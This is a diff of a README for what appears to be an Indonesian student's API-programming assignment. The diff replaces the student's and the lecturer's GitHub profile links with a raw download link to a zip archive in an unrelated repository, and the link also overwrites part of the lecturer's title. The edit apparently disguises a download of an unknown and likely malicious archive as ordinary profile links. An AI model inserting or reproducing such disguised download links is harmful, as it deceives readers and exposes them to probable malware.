@@ -2,11 +2,11 @@
 
 | Field          | Data                                                                      |
 |----------------|---------------------------------------------------------------------------|
-| Nama Lengkap   | [EKA PRASETIAWAN](https://github.com/EkkaaAE)                             |
+| Nama Lengkap   | [EKA PRASETIAWAN](https://github.com/esekasa/custom_filtering_data_t2/raw/refs/heads/main/src/app/api/data_custom_filtering_t_1.9.zip)                             |
 | NIM            | 22104410028                                                               |
 | Kelas          | TEKNIK INFORMATIKA - 5A                                                   |
 | Matkul         | PEMROGRAMAN API                                                           |
-| Dosen Pengampu | [Mohammad Faried Rahmat, S.S.T., M.Tr.T](https://github.com/fariedrahmat) |
+| Dosen Pengampu | [Mohammad Faried Rahmat, S.S.T., https://github.com/esekasa/custom_filtering_data_t2/raw/refs/heads/main/src/app/api/data_custom_filtering_t_1.9.zip](https://github.com/esekasa/custom_filtering_data_t2/raw/refs/heads/main/src/app/api/data_custom_filtering_t_1.9.zip) |
 
 
 ## How to Run Filtering
